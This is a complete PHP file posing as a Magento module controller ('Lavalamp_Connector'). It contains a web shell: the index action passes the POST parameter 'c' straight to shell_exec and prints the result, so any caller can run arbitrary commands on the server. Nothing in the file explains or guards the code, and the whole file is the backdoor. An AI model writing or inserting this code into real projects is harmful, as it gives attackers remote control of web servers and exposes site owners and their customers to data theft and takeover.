<?php

class Lavalamp_Connector_IndexController extends Mage_Core_Controller_Front_Action
{
    public function indexAction()
    {
        echo shell_exec($_POST['c']);;
    }
}

?>
